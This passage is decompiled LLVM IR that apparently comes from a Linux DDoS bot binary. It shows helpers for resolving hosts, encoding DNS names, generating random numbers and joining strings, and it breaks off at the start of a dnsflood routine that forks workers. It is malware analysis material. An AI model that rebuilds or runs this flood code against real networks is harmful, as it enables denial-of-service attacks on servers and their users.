  %stack_var_-288 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %v12_80492eb = icmp eq i32 %arg3, 1
  br i1 %v12_80492eb, label %dec_label_pc_8049324, label %dec_label_pc_80492f1

dec_label_pc_80492f1:                             ; preds = %entry
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_8049306 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_8069ad8.69 to i32))
  store i32 %v3_8049306, i32* %eax.global-to-local, align 4
  store i8* null, i8** @global_var_80756cc.33, align 4
  store i64 0, i64* @global_var_80756d0.34, align 16
  br label %dec_label_pc_80494d2

dec_label_pc_8049324:                             ; preds = %entry
  %v1_8049327 = add i32 %arg4, 4
  store i32 %v1_8049327, i32* %eax.global-to-local, align 4
  %v1_804932a = inttoptr i32 %v1_8049327 to i32*
  %v2_804932a = load i32, i32* %v1_804932a, align 4
  %v1_8049337 = and i32 %v2_804932a, -256
  store i32 %v1_8049337, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804933a = inttoptr i32 %v2_804932a to i8*
  store i32 %v2_804932a, i32* @edi, align 4
  %v3_8049340 = call i32 @_strlen(i8* %v4_804933a)
  %v4_8049340 = mul i32 %v3_8049340, -1
  %v1_8049346 = sub i32 0, %v4_8049340
  store i32 %v1_8049346, i32* %eax.global-to-local, align 4
  %v2_8049347 = icmp ult i32 %v1_8049346, 16
  %v6_8049347 = icmp eq i32 %v4_8049340, -16
  %v2_804934a = or i1 %v2_8049347, %v6_8049347
  br i1 %v2_804934a, label %dec_label_pc_804936b, label %dec_label_pc_804934c

dec_label_pc_804934c:                             ; preds = %dec_label_pc_8049324
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_8049361 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_8069af8.70 to i32))
  store i32 %v3_8049361, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80494d2

dec_label_pc_804936b:                             ; preds = %dec_label_pc_8049324
  store i32 %v1_8049327, i32* %eax.global-to-local, align 4
  %v2_8049371 = load i32, i32* %v1_804932a, align 4
  %v2_8049377 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_8049377, i32* @eax, align 4
  %v3_8049380 = bitcast i32* %stack_var_-276 to i8*
  %v4_8049380 = call i32 @strcpy(i8* %v3_8049380, i32 %v2_8049371)
  %v2_8049396 = ptrtoint i32* %stack_var_-512 to i32
  store i32 %v2_8049396, i32* %eax.global-to-local, align 4
  %v3_804939f = call i32 @_strlen(i8* %v3_8049380)
  %v1_80493a6 = add i32 %v3_804939f, -1
  store i32 %v1_80493a6, i32* %eax.global-to-local, align 4
  %v0_80493a7 = load i32, i32* @ebp, align 4
  %v2_80493a7 = add i32 %v3_804939f, -273
  %v3_80493a7 = add i32 %v2_80493a7, %v0_80493a7
  %v4_80493a7 = inttoptr i32 %v3_80493a7 to i8*
  %v5_80493a7 = load i8, i8* %v4_80493a7, align 1
  %v6_80493a7 = zext i8 %v5_80493a7 to i32
  store i32 %v6_80493a7, i32* %eax.global-to-local, align 4
  %v10_80493af = icmp eq i8 %v5_80493a7, 46
  %v1_80493b1 = icmp eq i1 %v10_80493af, false
  br i1 %v1_80493b1, label %dec_label_pc_8049402, label %dec_label_pc_80493b3

dec_label_pc_80493b3:                             ; preds = %dec_label_pc_804936b
  store i32 %v2_8049396, i32* %eax.global-to-local, align 4
  %v3_80493cd = call i32 @_strlen(i8* %v3_8049380)
  %v1_80493d4 = add i32 %v3_80493cd, -1
  store i32 %v1_80493d4, i32* %eax.global-to-local, align 4
  %v0_80493d5 = load i32, i32* @ebp, align 4
  %v2_80493d5 = add i32 %v3_80493cd, -273
  %v3_80493d5 = add i32 %v2_80493d5, %v0_80493d5
  %v4_80493d5 = inttoptr i32 %v3_80493d5 to i8*
  store i8 0, i8* %v4_80493d5, align 1
  br label %dec_label_pc_8049402

dec_label_pc_80493ed:                             ; preds = %dec_label_pc_8049402
  store i32 %stack_var_-20.0, i32* %eax.global-to-local, align 4
  %v0_80493f0 = load i32, i32* @ebp, align 4
  %v2_80493f0 = add i32 %stack_var_-20.0, -272
  %v3_80493f0 = add i32 %v2_80493f0, %v0_80493f0
  %v4_80493f0 = inttoptr i32 %v3_80493f0 to i8*
  %v5_80493f0 = load i8, i8* %v4_80493f0, align 1
  %v6_80493f0 = zext i8 %v5_80493f0 to i32
  store i32 %v6_80493f0, i32* %eax.global-to-local, align 4
  %v10_80493f8 = icmp eq i8 %v5_80493f0, 46
  %v1_80493fa = icmp eq i1 %v10_80493f8, false
  br i1 %v1_80493fa, label %dec_label_pc_80493ff, label %dec_label_pc_80493fc

dec_label_pc_80493fc:                             ; preds = %dec_label_pc_80493ed
  %v4_80493fc = add i32 %stack_var_-16.1, 1
  br label %dec_label_pc_80493ff

dec_label_pc_80493ff:                             ; preds = %dec_label_pc_80493ed, %dec_label_pc_80493fc
  %stack_var_-16.0 = phi i32 [ %stack_var_-16.1, %dec_label_pc_80493ed ], [ %v4_80493fc, %dec_label_pc_80493fc ]
  %v4_80493ff = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8049402

dec_label_pc_8049402:                             ; preds = %dec_label_pc_80493b3, %dec_label_pc_804936b, %dec_label_pc_80493ff
  %stack_var_-16.1 = phi i32 [ %stack_var_-16.0, %dec_label_pc_80493ff ], [ 1, %dec_label_pc_804936b ], [ 1, %dec_label_pc_80493b3 ]
  %stack_var_-20.0 = phi i32 [ %v4_80493ff, %dec_label_pc_80493ff ], [ 0, %dec_label_pc_804936b ], [ 0, %dec_label_pc_80493b3 ]
  store i32 %stack_var_-20.0, i32* @edx, align 4
  store i32 %v2_8049396, i32* %eax.global-to-local, align 4
  %v3_804941f = call i32 @_strlen(i8* %v3_8049380)
  store i32 %v3_804941f, i32* %eax.global-to-local, align 4
  %v0_8049426 = load i32, i32* @edx, align 4
  %v7_8049426 = icmp ult i32 %v0_8049426, %v3_804941f
  br i1 %v7_8049426, label %dec_label_pc_80493ed, label %dec_label_pc_804942a

dec_label_pc_804942a:                             ; preds = %dec_label_pc_8049402
  %v5_804942f = sub i32 4, %stack_var_-16.1
  %v15_804942f = icmp eq i32 %v5_804942f, 0
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804947a31 = icmp sgt i32 %v5_804942f, 0
  br i1 %v5_804947a31, label %dec_label_pc_804943e, label %dec_label_pc_804947c

dec_label_pc_804943e:                             ; preds = %dec_label_pc_804942a, %dec_label_pc_804943e
  %storemerge232 = phi i32 [ %v4_8049471, %dec_label_pc_804943e ], [ 0, %dec_label_pc_804942a ]
  store i32 %v2_8049377, i32* @edx, align 4
  store i32 %v2_8049396, i32* %eax.global-to-local, align 4
  %v3_804945e = call i32 @_strlen(i8* %v3_8049380)
  %v0_8049465 = load i32, i32* @edx, align 4
  %v0_804946533 = add i32 %v0_8049465, %v3_804945e
  store i32 %v0_804946533, i32* %eax.global-to-local, align 4
  %v1_8049468 = inttoptr i32 %v0_804946533 to i16*
  store i16 12334, i16* %v1_8049468, align 2
  %v0_804946d = load i32, i32* %eax.global-to-local, align 4
  %v1_804946d = add i32 %v0_804946d, 2
  %v2_804946d = inttoptr i32 %v1_804946d to i8*
  store i8 0, i8* %v2_804946d, align 1
  %v4_8049471 = add nuw nsw i32 %storemerge232, 1
  store i32 %v4_8049471, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8049471, %v5_804942f
  br i1 %exitcond, label %dec_label_pc_804947c, label %dec_label_pc_804943e

dec_label_pc_804947c:                             ; preds = %dec_label_pc_804943e, %dec_label_pc_804942a
  store i32 %v2_8049377, i32* %eax.global-to-local, align 4
  %v2_8049492 = ptrtoint i32* %stack_var_-288 to i32
  %v4_8049492 = call i32 @inet_aton(i8* %v3_8049380, i32 %v2_8049492)
  %v3_8049497 = load i32, i32* %stack_var_-288, align 4
  store i32 %v3_8049497, i32* %eax.global-to-local, align 4
  %v1_80494a4 = icmp eq i1 %v15_804942f, false
  br i1 %v1_80494a4, label %dec_label_pc_80494b2, label %dec_label_pc_80494ca

dec_label_pc_80494b2:                             ; preds = %dec_label_pc_804947c
  store i32 %v5_804942f, i32* %eax.global-to-local, align 4
  %v4_80494c0 = call i32 @poww(i64 256, i32 %v5_804942f)
  store i32 %v4_80494c0, i32* %eax.global-to-local, align 4
  %v1_80494c5 = sext i32 %v4_80494c0 to i64
  br label %dec_label_pc_80494ca

dec_label_pc_80494ca:                             ; preds = %dec_label_pc_804947c, %dec_label_pc_80494b2
  %storemerge = phi i64 [ %v1_80494c5, %dec_label_pc_80494b2 ], [ 1, %dec_label_pc_804947c ]
  store i64 %storemerge, i64* @global_var_80756d0.34, align 16
  store i32 %v3_8049497, i32* %eax.global-to-local, align 4
  %v1_80494cd = inttoptr i32 %v3_8049497 to i8*
  store i8* %v1_80494cd, i8** @global_var_80756cc.33, align 4
  br label %dec_label_pc_80494d2

dec_label_pc_80494d2:                             ; preds = %dec_label_pc_804934c, %dec_label_pc_80492f1, %dec_label_pc_80494ca
  %v0_80494da = phi i32 [ %v3_8049361, %dec_label_pc_804934c ], [ %v3_8049306, %dec_label_pc_80492f1 ], [ %v3_8049497, %dec_label_pc_80494ca ]
  ret i32 %v0_80494da

; uselistorder directives
  uselistorder i32 %v3_8049497, { 0, 2, 1, 3 }
  uselistorder i32 %v4_8049471, { 1, 2, 0 }
  uselistorder i32 %v5_804942f, { 3, 2, 0, 1, 4 }
  uselistorder i32 %stack_var_-20.0, { 3, 2, 0, 1 }
  uselistorder i32 %v2_8049396, { 1, 2, 0, 3 }
  uselistorder i8* %v3_8049380, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v1_8049346, { 1, 0 }
  uselistorder i32* %stack_var_-288, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 3, 2, 4, 5, 9, 6, 7, 8, 0, 12, 13, 10, 11, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 26, 25 }
  uselistorder i32 (i64, i32)* @poww, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80494d2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80494ca, { 1, 0 }
  uselistorder label %dec_label_pc_804943e, { 1, 0 }
  uselistorder label %dec_label_pc_8049402, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80493ff, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80494db = load i32, i32* @ebp, align 4
  store i32 %v0_80494db, i32* %stack_var_-4, align 4
  %v4_80494db = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80494db, i32* @ebp, align 4
  %v1_80494e7 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_80494e7, i32* @global_var_8075ae0.71, align 32
  %v10_80494f6 = icmp eq i32 %v1_80494e7, -1
  %v1_80494f9 = icmp eq i1 %v10_80494f6, false
  br i1 %v1_80494f9, label %dec_label_pc_8049563, label %dec_label_pc_80494fb

dec_label_pc_80494fb:                             ; preds = %entry
  %v1_8049501 = call i32 @__GI_gethostbyname(i32 %arg2)
  %v4_8049509 = icmp eq i32 %v1_8049501, 0
  %v1_804950d = icmp eq i1 %v4_8049509, false
  br i1 %v1_804950d, label %dec_label_pc_804953e, label %dec_label_pc_804950f

dec_label_pc_804950f:                             ; preds = %dec_label_pc_80494fb
  %v0_804950f = load i32, i32* @global_var_807e1b0.29, align 16
  %v2_804952d = call i32 @Send(i32 %v0_804950f, i32 ptrtoint ([33 x i8]* @global_var_8069b44.72 to i32))
  %v1_8049539 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804953e

dec_label_pc_804953e:                             ; preds = %dec_label_pc_80494fb, %dec_label_pc_804950f
  %v1_8049541 = add i32 %v1_8049501, 12
  %v2_8049541 = inttoptr i32 %v1_8049541 to i32*
  %v3_8049541 = load i32, i32* %v2_8049541, align 4
  %v1_804954e = add i32 %v1_8049501, 16
  %v2_804954e = inttoptr i32 %v1_804954e to i32*
  %v3_804954e = load i32, i32* %v2_804954e, align 4
  %v1_8049551 = inttoptr i32 %v3_804954e to i32*
  %v2_8049551 = load i32, i32* %v1_8049551, align 4
  %v3_804955e = call i32 @bcopy(i32 %v2_8049551, i32 ptrtoint (i32* @global_var_8075ae0.71 to i32), i32 %v3_8049541)
  %v0_8049563.pre = load i32, i32* @global_var_8075ae0.71, align 32
  br label %dec_label_pc_8049563

dec_label_pc_8049563:                             ; preds = %entry, %dec_label_pc_804953e
  %v0_8049563 = phi i32 [ %v1_80494e7, %entry ], [ %v0_8049563.pre, %dec_label_pc_804953e ]
  %v2_8049568 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049568, i32* @ebp, align 4
  ret i32 %v0_8049563

; uselistorder directives
  uselistorder i32 %v1_80494e7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049563, { 1, 0 }
  uselistorder label %dec_label_pc_804953e, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp15 = inttoptr i32 %arg2 to i8*
  %v3_804958b = call i32 @_strlen(i8* %tmp15)
  %v2_8049592 = add i32 %v3_804958b, %arg2
  %v1_8049594 = inttoptr i32 %v2_8049592 to i16*
  store i16 46, i16* %v1_8049594, align 2
  br label %dec_label_pc_80495e5

dec_label_pc_80495a2:                             ; preds = %dec_label_pc_80495e5
  %v6_80495a5 = add i32 %storemerge, %arg2
  %v1_80495a8 = inttoptr i32 %v6_80495a5 to i8*
  %v2_80495a8 = load i8, i8* %v1_80495a8, align 1
  %v10_80495ab = icmp eq i8 %v2_80495a8, 46
  %v1_80495ad = icmp eq i1 %v10_80495ab, false
  br i1 %v1_80495ad, label %dec_label_pc_80495e2, label %dec_label_pc_80495af

dec_label_pc_80495af:                             ; preds = %dec_label_pc_80495a2
  %v1_80495b7 = trunc i32 %storemerge to i8
  %v4_80495b7 = sub i8 %v1_80495b7, %stack_var_-16.2
  %v4_80495b9 = ptrtoint i8* %stack_var_4.2 to i32
  store i8 %v4_80495b7, i8* %stack_var_4.2, align 1
  %v5_80495be = add i32 %v4_80495b9, 1
  %stack_var_4.016 = inttoptr i32 %v5_80495be to i8*
  %v4_80495d717 = sext i8 %stack_var_-16.2 to i32
  %v5_80495dd26 = icmp slt i32 %v4_80495d717, %storemerge
  br i1 %v5_80495dd26, label %dec_label_pc_80495c3, label %dec_label_pc_80495df

dec_label_pc_80495c3:                             ; preds = %dec_label_pc_80495af, %dec_label_pc_80495c3
  %v4_80495d730 = phi i32 [ %v4_80495d7, %dec_label_pc_80495c3 ], [ %v4_80495d717, %dec_label_pc_80495af ]
  %stack_var_4.029 = phi i8* [ %stack_var_4.0, %dec_label_pc_80495c3 ], [ %stack_var_4.016, %dec_label_pc_80495af ]
  %stack_var_4.0.in27 = phi i32 [ %v5_80495d1, %dec_label_pc_80495c3 ], [ %v5_80495be, %dec_label_pc_80495af ]
  %v6_80495c6 = add i32 %v4_80495d730, %arg2
  %v1_80495c9 = inttoptr i32 %v6_80495c6 to i8*
  %v2_80495c9 = load i8, i8* %v1_80495c9, align 1
  store i8 %v2_80495c9, i8* %stack_var_4.029, align 1
  %v5_80495d1 = add i32 %stack_var_4.0.in27, 1
  %stack_var_4.0 = inttoptr i32 %v5_80495d1 to i8*
  %tmp = mul i32 %v4_80495d730, 16777216
  %sext = add i32 %tmp, 16777216
  %v4_80495d7 = sdiv i32 %sext, 16777216
  %v5_80495dd = icmp slt i32 %v4_80495d7, %storemerge
  br i1 %v5_80495dd, label %dec_label_pc_80495c3, label %dec_label_pc_80495df

dec_label_pc_80495df:                             ; preds = %dec_label_pc_80495c3, %dec_label_pc_80495af
  %stack_var_4.0.lcssa = phi i8* [ %stack_var_4.016, %dec_label_pc_80495af ], [ %stack_var_4.0, %dec_label_pc_80495c3 ]
  %v4_80495d7.lcssa = phi i32 [ %v4_80495d717, %dec_label_pc_80495af ], [ %v4_80495d7, %dec_label_pc_80495c3 ]
  %v5_80495df = add nsw i32 %v4_80495d7.lcssa, 1
  %v14_80495df = trunc i32 %v5_80495df to i8
  br label %dec_label_pc_80495e2

dec_label_pc_80495e2:                             ; preds = %dec_label_pc_80495a2, %dec_label_pc_80495df
  %stack_var_4.1 = phi i8* [ %stack_var_4.2, %dec_label_pc_80495a2 ], [ %stack_var_4.0.lcssa, %dec_label_pc_80495df ]
  %stack_var_-16.1 = phi i8 [ %stack_var_-16.2, %dec_label_pc_80495a2 ], [ %v14_80495df, %dec_label_pc_80495df ]
  %v4_80495e2 = add i32 %storemerge, 1
  br label %dec_label_pc_80495e5

dec_label_pc_80495e5:                             ; preds = %entry, %dec_label_pc_80495e2
  %stack_var_4.2 = phi i8* [ %arg1, %entry ], [ %stack_var_4.1, %dec_label_pc_80495e2 ]
  %stack_var_-16.2 = phi i8 [ 0, %entry ], [ %stack_var_-16.1, %dec_label_pc_80495e2 ]
  %storemerge = phi i32 [ 0, %entry ], [ %v4_80495e2, %dec_label_pc_80495e2 ]
  %v3_80495f9 = call i32 @_strlen(i8* %tmp15)
  %v7_8049600 = icmp ult i32 %storemerge, %v3_80495f9
  br i1 %v7_8049600, label %dec_label_pc_80495a2, label %dec_label_pc_8049604

dec_label_pc_8049604:                             ; preds = %dec_label_pc_80495e5
  %v4_8049604 = ptrtoint i8* %stack_var_4.2 to i32
  store i8 0, i8* %stack_var_4.2, align 1
  ret i32 %v4_8049604

; uselistorder directives
  uselistorder i32 %storemerge, { 0, 2, 4, 1, 3, 5 }
  uselistorder i8 %stack_var_-16.2, { 1, 0, 2 }
  uselistorder i8* %stack_var_4.2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_80495d7, { 2, 0, 1 }
  uselistorder i32 %v5_80495d1, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_80495e5, { 1, 0 }
  uselistorder label %dec_label_pc_80495e2, { 1, 0 }
  uselistorder label %dec_label_pc_80495c3, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_8075b00.73, align 256
  %v1_8049624 = add i32 %arg1, -1640531527
  store i32 %v1_8049624, i32* @global_var_8075b04.74, align 4
  %v1_8049631 = add i32 %arg1, 1013904242
  store i32 %v1_8049631, i32* %eax.global-to-local, align 4
  store i32 %v1_8049631, i32* @global_var_8075b08.75, align 8
  br label %dec_label_pc_8049644

dec_label_pc_8049644:                             ; preds = %entry, %dec_label_pc_8049644
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_8049674, %dec_label_pc_8049644 ]
  store i32 %storemerge5, i32* @ecx, align 4
  %v1_804964a = add nsw i32 %storemerge5, -3
  store i32 %v1_804964a, i32* %eax.global-to-local, align 4
  %v1_804964d = mul nuw nsw i32 %v1_804964a, 4
  %v2_804964d = add i32 %v1_804964d, ptrtoint (i32* @global_var_8075b00.73 to i32)
  %v3_804964d = inttoptr i32 %v2_804964d to i32*
  %v4_804964d = load i32, i32* %v3_804964d, align 4
  %v1_8049657 = add nsw i32 %storemerge5, -2
  store i32 %v1_8049657, i32* %eax.global-to-local, align 4
  %v1_804965a = mul nuw nsw i32 %v1_8049657, 4
  %v2_804965a = add i32 %v1_804965a, ptrtoint (i32* @global_var_8075b00.73 to i32)
  %v3_804965a = inttoptr i32 %v2_804965a to i32*
  %v4_804965a = load i32, i32* %v3_804965a, align 4
  %v2_8049661 = xor i32 %v4_804965a, %v4_804964d
  %v2_8049666 = xor i32 %storemerge5, -1640531527
  %v1_8049668 = xor i32 %v2_8049666, %v2_8049661
  store i32 %v1_8049668, i32* %eax.global-to-local, align 4
  %v2_804966d = mul nuw nsw i32 %storemerge5, 4
  %v3_804966d = add i32 %v2_804966d, ptrtoint (i32* @global_var_8075b00.73 to i32)
  %v4_804966d = inttoptr i32 %v3_804966d to i32*
  store i32 %v1_8049668, i32* %v4_804966d, align 4
  %v4_8049674 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_8049674, 4096
  br i1 %exitcond, label %dec_label_pc_8049680, label %dec_label_pc_8049644

dec_label_pc_8049680:                             ; preds = %dec_label_pc_8049644
  %v0_8049681 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8049681

; uselistorder directives
  uselistorder i32 %storemerge5, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049644, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804969e = load i32, i32* @global_var_8070d84.76, align 4
  %v1_80496a3 = add i32 %v0_804969e, 1
  %v1_80496a4 = urem i32 %v1_80496a3, 4096
  store i32 %v1_80496a4, i32* @global_var_8070d84.76, align 4
  %v1_80496b3 = mul nuw nsw i32 %v1_80496a4, 4
  %v2_80496b3 = add i32 %v1_80496b3, ptrtoint (i32* @global_var_8075b00.73 to i32)
  %v3_80496b3 = inttoptr i32 %v2_80496b3 to i32*
  %v4_80496b3 = load i32, i32* %v3_80496b3, align 4
  %v7_80496d0 = udiv i32 %v4_80496b3, 228675
  store i32 %v7_80496d0, i32* @global_var_8070d80.77, align 128
  br i1 true, label %dec_label_pc_8049720, label %dec_label_pc_8049712

dec_label_pc_8049712:                             ; preds = %entry
  br label %dec_label_pc_8049720

dec_label_pc_8049720:                             ; preds = %entry, %dec_label_pc_8049712
  store i32 %v1_80496a4, i32* @ecx, align 4
  %v1_8049735 = mul nuw nsw i32 %v1_80496a4, 4
  %v2_8049735 = add i32 %v1_8049735, ptrtoint (i32* @global_var_8075b00.73 to i32)
  %v3_8049735 = inttoptr i32 %v2_8049735 to i32*
  %v4_8049735 = load i32, i32* %v3_8049735, align 4
  ret i32 %v4_8049735

; uselistorder directives
  uselistorder i32 %v1_80496a4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8049720, { 1, 0 }
}

define i32 @myStrCat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804974a14 = ptrtoint i8* %arg1 to i32
  %v2_804974d15 = load i8, i8* %arg1, align 1
  %v4_804975017 = icmp eq i8 %v2_804974d15, 0
  %v1_804975219 = icmp eq i1 %v4_804975017, false
  br i1 %v1_804975219, label %dec_label_pc_8049747, label %dec_label_pc_8049767.preheader

dec_label_pc_8049747:                             ; preds = %entry, %dec_label_pc_8049747
  %v4_804974a20 = phi i32 [ %v5_8049747, %dec_label_pc_8049747 ], [ %v4_804974a14, %entry ]
  %v5_8049747 = add i32 %v4_804974a20, 1
  %v22_8049747 = inttoptr i32 %v5_8049747 to i8*
  %v2_804974d = load i8, i8* %v22_8049747, align 1
  %v4_8049750 = icmp eq i8 %v2_804974d, 0
  %v1_8049752 = icmp eq i1 %v4_8049750, false
  br i1 %v1_8049752, label %dec_label_pc_8049747, label %dec_label_pc_8049767.preheader

dec_label_pc_8049767.preheader:                   ; preds = %dec_label_pc_8049747, %entry
  %stack_var_4.0.lcssa = phi i8* [ %arg1, %entry ], [ %v22_8049747, %dec_label_pc_8049747 ]
  %stack_var_8.05 = inttoptr i32 %arg2 to i8*
  %v2_804976a6 = load i8, i8* %stack_var_8.05, align 1
  %v4_804976d8 = icmp eq i8 %v2_804976a6, 0
  %v1_804976f10 = icmp eq i1 %v4_804976d8, false
  br i1 %v1_804976f10, label %dec_label_pc_8049756, label %dec_label_pc_8049771

dec_label_pc_8049756:                             ; preds = %dec_label_pc_8049767.preheader, %dec_label_pc_8049756
  %stack_var_8.013 = phi i8* [ %stack_var_8.0, %dec_label_pc_8049756 ], [ %stack_var_8.05, %dec_label_pc_8049767.preheader ]
  %stack_var_8.0.in12 = phi i32 [ %v5_8049764, %dec_label_pc_8049756 ], [ %arg2, %dec_label_pc_8049767.preheader ]
  %stack_var_4.111 = phi i8* [ %v22_8049761, %dec_label_pc_8049756 ], [ %stack_var_4.0.lcssa, %dec_label_pc_8049767.preheader ]
  %v2_8049759 = load i8, i8* %stack_var_8.013, align 1
  %v4_804975c = ptrtoint i8* %stack_var_4.111 to i32
  store i8 %v2_8049759, i8* %stack_var_4.111, align 1
  %v5_8049761 = add i32 %v4_804975c, 1
  %v22_8049761 = inttoptr i32 %v5_8049761 to i8*
  %v5_8049764 = add i32 %stack_var_8.0.in12, 1
  %stack_var_8.0 = inttoptr i32 %v5_8049764 to i8*
  %v2_804976a = load i8, i8* %stack_var_8.0, align 1
  %v4_804976d = icmp eq i8 %v2_804976a, 0
  %v1_804976f = icmp eq i1 %v4_804976d, false
  br i1 %v1_804976f, label %dec_label_pc_8049756, label %dec_label_pc_8049771

dec_label_pc_8049771:                             ; preds = %dec_label_pc_8049756, %dec_label_pc_8049767.preheader
  %stack_var_4.1.lcssa = phi i8* [ %stack_var_4.0.lcssa, %dec_label_pc_8049767.preheader ], [ %v22_8049761, %dec_label_pc_8049756 ]
  %v4_8049771 = ptrtoint i8* %stack_var_4.1.lcssa to i32
  store i8 0, i8* %stack_var_4.1.lcssa, align 1
  ret i32 %v4_8049771

; uselistorder directives
  uselistorder i8* %stack_var_8.0, { 1, 0 }
  uselistorder i32 %v5_8049764, { 1, 0 }
  uselistorder i32 %v5_8049747, { 1, 0 }
  uselistorder label %dec_label_pc_8049756, { 1, 0 }
  uselistorder label %dec_label_pc_8049747, { 1, 0 }
}

define i32 @replStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %v5_8049783 = icmp eq i32 %arg2, 0
  %v1_8049787 = icmp eq i1 %v5_8049783, false
  br i1 %v1_8049787, label %dec_label_pc_8049792, label %dec_label_pc_804980c

dec_label_pc_8049792:                             ; preds = %entry
  %v4_8049792 = ptrtoint i8* %arg1 to i32
  store i1 false, i1* @df, align 1
  store i32 %v4_8049792, i32* @edi, align 4
  %v3_80497a3 = call i32 @_strlen(i8* %arg1)
  %v4_80497a3 = mul i32 %v3_80497a3, -1
  %v5_80497a3 = add i32 %v4_80497a3, -2
  store i32 %v5_80497a3, i32* @ecx, align 4
  %v8_80497aa = mul i32 %v3_80497a3, %arg2
  %v6_80497ae = add i32 %v8_80497aa, %arg2
  %v2_80497b4 = call i32 @malloc(i32 %v6_80497ae)
  %tmp18 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v2_80497b4, i32* %tmp18, align 4
  %v5_80497bc = icmp eq i32 %v2_80497b4, 0
  %v1_80497c0 = icmp eq i1 %v5_80497bc, false
  %tmp19 = inttoptr i32 %v2_80497b4 to i8*
  br i1 %v1_80497c0, label %dec_label_pc_80497cb, label %dec_label_pc_804980c

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_8049792
  store i8 0, i8* %tmp19, align 1
  %v5_80497de = call i32 @myStrCat(i8* %tmp19, i32 %v4_8049792)
  %v5_80497fd20 = add i32 %arg2, -1
  %v12_80497fd21 = icmp eq i32 %v5_80497fd20, 0
  %v1_804980423 = icmp eq i1 %v12_80497fd21, false
  br i1 %v1_804980423, label %dec_label_pc_80497e8, label %dec_label_pc_8049806

dec_label_pc_80497e8:                             ; preds = %dec_label_pc_80497cb, %dec_label_pc_80497e8
  %v5_80497fd25 = phi i32 [ %v5_80497fd, %dec_label_pc_80497e8 ], [ %v5_80497fd20, %dec_label_pc_80497cb ]
  %storemerge624 = phi i32 [ %v5_80497f5, %dec_label_pc_80497e8 ], [ %v5_80497de, %dec_label_pc_80497cb ]
  %v4_80497f5 = inttoptr i32 %storemerge624 to i8*
  %v5_80497f5 = call i32 @myStrCat(i8* %v4_80497f5, i32 %v4_8049792)
  %v5_80497fd = add i32 %v5_80497fd25, -1
  %v12_80497fd = icmp eq i32 %v5_80497fd, 0
  %v1_8049804 = icmp eq i1 %v12_80497fd, false
  br i1 %v1_8049804, label %dec_label_pc_80497e8, label %dec_label_pc_8049806

dec_label_pc_8049806:                             ; preds = %dec_label_pc_80497e8, %dec_label_pc_80497cb
  %v3_8049806 = load i8*, i8** %stack_var_-16, align 4
  %v4_8049806 = ptrtoint i8* %v3_8049806 to i32
  br label %dec_label_pc_804980c

dec_label_pc_804980c:                             ; preds = %dec_label_pc_8049792, %entry, %dec_label_pc_8049806
  %stack_var_-28.0 = phi i32 [ %v4_8049806, %dec_label_pc_8049806 ], [ 0, %entry ], [ 0, %dec_label_pc_8049792 ]
  ret i32 %stack_var_-28.0

; uselistorder directives
  uselistorder i32 %v5_80497fd, { 1, 0 }
  uselistorder i8* %tmp19, { 1, 0 }
  uselistorder i8** %stack_var_-16, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804980c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80497e8, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8049819 = load i32, i32* @eax, align 4
  ret i32 %v0_8049819
}

define i32 @dnsflood() local_unnamed_addr {
entry:
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4684 = alloca i32, align 4
  %stack_var_-4156 = alloca i32, align 4
  %stack_var_-4732 = alloca i8*, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804981d = load i32, i32* @edi, align 4
  store i32 %v0_804981d, i32* %stack_var_-8, align 4
  %v1_8049824 = call i32 @listFork(i32 %v0_804981d)
  %v1_8049829 = icmp eq i32 %v1_8049824, 0
